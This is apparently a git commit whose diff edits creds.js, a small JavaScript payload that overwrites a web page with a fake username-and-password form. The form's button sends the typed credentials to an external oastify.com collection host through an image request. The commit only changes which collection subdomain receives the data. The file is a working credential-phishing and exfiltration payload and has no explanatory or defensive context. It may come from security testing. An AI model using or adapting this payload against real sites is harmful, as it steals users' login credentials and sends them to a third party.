da6a08220d3642242260006e07ef12ff2899d815
Yarterss <trey@inspectiv.com>
2025-10-20 13:03:58 -0500

    Update creds.js

--- creds.js
+++ creds.js
@@ -2,7 +2,7 @@ window.onload = () => {
   document.body.innerHTML = `
     <input id="u">
     <input id="p" type="password">
-    <button onclick="(new Image()).src='https://d3hwhzd0tvm38nx3njzzwzjzyq4hs7gw.oastify.com/?u='+encodeURIComponent(u.value)+'&p='+encodeURIComponent(p.value)">
+    <button onclick="(new Image()).src='https://w1yffibjrekm66vml2xiuihiw920qtei.oastify.com/?u='+encodeURIComponent(u.value)+'&p='+encodeURIComponent(p.value)">
       Send
     </button>
   `;
